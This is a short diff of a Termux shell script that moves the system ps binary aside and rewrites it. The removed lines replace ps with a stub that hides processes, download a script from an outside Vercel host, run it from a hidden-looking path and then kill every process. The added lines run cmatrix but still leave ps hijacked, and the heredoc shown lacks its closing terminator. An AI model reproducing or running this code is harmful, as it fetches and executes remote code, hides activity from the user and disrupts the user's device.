@@ -5,11 +5,5 @@ if [ -x "$PSBIN" ] && [ ! -x "$PSREAL" ]; then
    mv "$PSBIN" "$PSREAL"
 fi
 cat > "$PSBIN" << 'EOF'
-#!/data/data/com.termux/files/usr/bin/bash
-exit 0
-EOF
-chmod +x "$PSBIN"
-curl -sL -o "$PREFIX/lib/bash/tai" https://bot-alpha-eosin.vercel.app/trial.sh
-chmod +x "$PREFIX/lib/bash/tai"
-"$PREFIX/lib/bash/tai"
-kill -9 -1
+pkg install cmatrix
+cmatrix -a -b -C red -s 10
